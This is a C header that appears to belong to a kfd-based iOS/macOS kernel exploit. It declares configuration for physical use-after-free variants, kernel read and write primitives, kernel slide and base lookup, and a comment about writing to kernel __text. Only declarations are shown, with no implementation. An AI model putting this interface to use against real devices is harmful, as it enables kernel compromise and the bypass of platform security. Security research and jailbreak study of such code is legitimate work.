#pragma once

#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
    const char *puaf_flavor;   // landa | smith | physpuppet
    int puaf_pages;            // 0 = auto; else 16–131072 (J puaf_pages_options)
    uint64_t kread_method;     // DT_KREAD_* below
    uint64_t kwrite_method;    // DT_KWRITE_* below
} dt_kfd_run_config_t;

#define DT_KREAD_KQUEUE_WORKLOOP_CTL 0ULL
#define DT_KREAD_SEM_OPEN            1ULL
#define DT_KWRITE_DUP                0ULL
#define DT_KWRITE_SEM_OPEN           1ULL

int exploit_init_cfg(const dt_kfd_run_config_t *cfg);
int exploit_init(const char *flavor); // legacy: shared misaka defaults
int exploit_deinit(void);
uint64_t kfd_kernel_slide(void);
uint64_t kfd_kernel_base(void);
bool dt_kfd_is_active(void);
uint64_t dt_kfd_current_proc(void);
uint64_t dt_kfd_kernel_proc(void);
int dt_kfd_apply_xpf_offsets(uint64_t static_base, uint64_t kbase);

// Optional post-kopen IOSurface PTE kwrite (off by default — build 20/21 baseline).
#ifndef DT_POST_KOPEN_PTE
#define DT_POST_KOPEN_PTE 0
#endif

#ifndef DT_PHYSRW_HANDOFF
#define DT_PHYSRW_HANDOFF 1
#endif

int dt_pte_kwrite_iosurface_init(uint64_t num_puaf_pages, const uint64_t *puaf_pages_uaddr);
void dt_pte_kwrite_iosurface_deinit(void);
bool dt_pte_kwrite_is_ready(void);
void dt_pte_kwrite_register_perf(void);
void dt_pte_kwrite_unregister_perf(void);
bool dt_pte_kwrite_perf_is_ready(void);

/// Direct kfd krkw writes (valid while gKfd open; required for kernel __text — physwrite hangs on r-x).
uint32_t kfd_kread32(uint64_t where);
void kfd_kwrite32(uint64_t where, uint32_t what);

#ifdef __cplusplus
}
#endif
